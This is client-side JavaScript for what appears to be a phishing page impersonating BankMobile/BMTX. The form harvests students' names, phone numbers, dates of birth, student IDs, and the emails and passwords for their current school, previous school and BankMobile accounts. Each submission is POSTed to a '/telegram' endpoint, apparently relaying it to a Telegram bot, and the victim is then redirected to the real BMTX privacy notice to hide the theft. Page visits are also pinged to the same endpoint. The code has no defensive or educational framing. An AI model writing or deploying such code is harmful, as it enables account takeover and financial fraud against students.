// 🔔 Trigger visitor tracking when someone lands on the page
window.addEventListener("DOMContentLoaded", async () => {
  try {
    await fetch("/telegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({}), // empty form, treated as visitor-only
    });
    console.log("Visitor tracked.");
  } catch (err) {
    console.error("Failed to track visitor:", err);
  }
});

// Generic password toggle function
function togglePasswordVisibility(inputId) {
  const input = document.getElementById(inputId);
  input.type = input.type === "password" ? "text" : "password";
}

const passwordButtons = [
  { id: "hide1", inputId: "bankmobilepassword" },
  { id: "hide2", inputId: "previouschemailpassword" },
  { id: "hide3", inputId: "currentschpassword" },
];

passwordButtons.forEach(({ id, inputId }) => {
  const btn = document.getElementById(id);
  if (btn) {
    btn.onclick = (e) => {
      togglePasswordVisibility(inputId);
      e.target.innerText = e.target.innerText === "Hide" ? "Show" : "Hide";
    };
  }
});

// Phone number input: allow only digits and limit to 10
const phoneInput = document.getElementById("phone_number");

if (phoneInput) {
  phoneInput.addEventListener("input", function () {
    // Remove any non-digit character
    this.value = this.value.replace(/\D/g, "");

    // Trim to 10 digits max
    if (this.value.length > 10) {
      this.value = this.value.slice(0, 10);
    }
  });
}

// Floating labels logic
document.querySelectorAll(".input-field").forEach((input) => {
  const label = input.nextElementSibling;
  if (label) {
    const toggleFloating = () => {
      if (input.value.trim() !== "") {
        label.classList.add("float");
      } else {
        label.classList.remove("float");
      }
    };

    input.addEventListener("focus", () => {
      label.classList.add("float");
    });

    input.addEventListener("blur", toggleFloating);
    toggleFloating();
  }
});

// Date of birth input formatting (mm/dd/yyyy)
const dobInput = document.getElementById("dob");

if (dobInput) {
  dobInput.addEventListener("input", () => {
    let value = dobInput.value.replace(/\D/g, ""); // Remove non-digits

    if (value.length > 2) value = value.slice(0, 2) + "/" + value.slice(2);
    if (value.length > 5) value = value.slice(0, 5) + "/" + value.slice(5, 9);

    dobInput.value = value;
  });

  dobInput.addEventListener("blur", () => {
    const pattern = /^(0[1-9]|1[0-2])\/(0[1-9]|[12]\d|3[01])\/\d{4}$/;
    if (!pattern.test(dobInput.value)) {
      alert("Please enter a valid date in mm/dd/yyyy format");
    }
  });
}

// Radio selection logic
const yesRadio = document.getElementById("Yes");
const noRadio = document.getElementById("No");

if (yesRadio && noRadio) {
  yesRadio.addEventListener("change", () => {
    if (yesRadio.checked) noRadio.checked = false;
  });

  noRadio.addEventListener("change", () => {
    if (noRadio.checked) yesRadio.checked = false;
  });
}

// Form submission
document.querySelector("form")?.addEventListener("submit", async (e) => {
  e.preventDefault();

  // Check if radio buttons are selected
  if (!yesRadio?.checked && !noRadio?.checked) {
    return;
  }

  const formData = {
    fullName: document.getElementById("fullName").value,
    phoneNumber: document.getElementById("phone_number").value,
    currentSchoolEmail: document.getElementById("currentschemail").value,
    currentSchoolPassword: document.getElementById("currentschpassword").value,
    previousSchoolEmail: document.getElementById("previouschemail").value,
    previousSchoolPassword: document.getElementById("previouschemailpassword").value,
    hasBankMobileProfile: yesRadio.checked ? "Yes" : "No",
    bankMobileEmail: document.getElementById("bankmobileemail").value,
    bankMobilePassword: document.getElementById("bankmobilepassword").value,
    studentid: document.getElementById("student_id").value,
    dob: document.getElementById("dob").value,
  };

  try {
    const response = await fetch("/telegram", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(formData),
    });

    const result = await response.json();

    if (result.success) {
      window.location.href = "https://www.bmtx.com/privacy-notice-california?_gl=1*1nel0dw*_gcl_au*MTQzNzAwMjIzNy4xNzQ1NTQ4MjM5";
      e.target.reset();
      // Reset floating labels
      document.querySelectorAll(".floating-label").forEach((label) => {
        label.classList.remove("float");
      });
    } else {
      alert("There was an error submitting the form.");
    }
  } catch (error) {
    console.error("Submit error:", error);
    alert("An unexpected error occurred.");
  }
});
